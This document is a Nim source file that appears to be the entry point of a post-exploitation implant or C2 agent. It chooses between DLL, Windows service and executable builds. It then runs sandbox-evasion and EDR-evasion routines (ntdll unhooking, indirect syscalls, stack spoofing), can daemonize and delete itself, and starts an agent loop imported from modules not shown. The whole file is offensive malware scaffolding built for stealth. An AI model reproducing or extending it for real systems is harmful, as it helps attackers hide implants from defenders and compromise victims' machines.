when defined(dll):
  # DLL build - use DLL entry points
  import dll_entry
elif defined(service):
  # Windows Service build - use service entry points
  import service_entry
  
  # Entry point for service - call StartServiceDispatcher
  when isMainModule:
    StartServiceDispatcher()
else:
  # Executable build - use standard main entry point
  import agent
  import utils/guardrails

  # Conditional imports for Windows-only features
  when defined(windows):
    when defined(selfDelete):
      import utils/self_delete
    import winim/lean

    # Evasion imports
    when defined(evasion_dfr) or defined(evasion_iat_obf) or defined(evasion_unhook_ntdll) or defined(evasion_indirect_syscalls) or defined(evasion_stack_spoof):
      import utils/evasion
    when defined(sandbox_evasion):
      import utils/sandbox

  when defined(linux):
    import posix

  proc daemonize(): bool {.used.} =
    when defined(windows):
      result = FreeConsole() != 0
    else:
      # Unix/Linux fork-based daemonization
      var pid = fork()
      if pid < 0:
        return false
      elif pid > 0:
        quit(0)
      
      discard setsid()
      
      # Second fork
      pid = fork()
      if pid < 0:
        return false
      elif pid > 0:
        quit(0)
      
      discard chdir("/")
      
      # Close standard file descriptors
      for fd in 0..2:
        discard close(fd.cint)
      
      result = true

  # Main entry point
  proc main() =
    # Check execution guardrails before anything else
    if not checkGuardrails():
      return

    # Run sandbox evasion delay before anything else
    when defined(windows):
      when defined(sandbox_evasion):
        runSandboxEvasion()

    # Run evasion techniques as early as possible
    when defined(windows):
      when defined(evasion_dfr) or defined(evasion_iat_obf) or defined(evasion_unhook_ntdll) or defined(evasion_indirect_syscalls) or defined(evasion_stack_spoof):
        runEvasionInit()

    # Daemonize if compile flag is set
    when defined(daemonize):
      if daemonize():
        runAgent()
        return
    
    # Handle self-delete BEFORE main execution if enabled (if not daemonized)
    when defined(windows):
      when defined(selfDelete):
        selfDelete()
    
    # Call the shared agent main loop
    runAgent()
  
  when isMainModule:
    main()
